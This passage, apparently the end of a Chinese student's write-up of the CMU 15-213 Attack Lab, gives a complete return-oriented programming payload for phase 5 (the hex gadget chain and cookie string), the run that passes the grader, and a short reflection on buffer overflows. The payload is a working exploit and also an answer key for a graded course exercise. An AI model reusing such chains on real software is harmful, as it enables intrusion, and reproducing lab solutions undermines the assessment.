34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
00 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
```
测试，成功pass!
```common
➜  target1 ./hex2raw <phase_5.txt >phase_5-raw.txt
➜  target1 ./rtarget -q <phase_5-raw.txt
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 FF FF FF FF FF FF FF
```
#### 总结
ROP相对于CI来说难上了不少，主要难度在于我们可以使用的命令的种类被限定死了，只能通过现有的代码想办法去拼凑出我们想实现的结果，往往为了将一个值送到某个寄存器，我们需要经过很多次mov操作才能实现，其实一开始走了弯路，如果将start_farm到end_farm之间所有提供的操作都列出的话，进行相关的设计就简单上不少。总的来说ROP这一部分的实验也让我看到了缓冲区溢出攻击的威力，明白了为什么类似于gets这样的函数在后来的改进版本中都需要限定输入长度的原因。
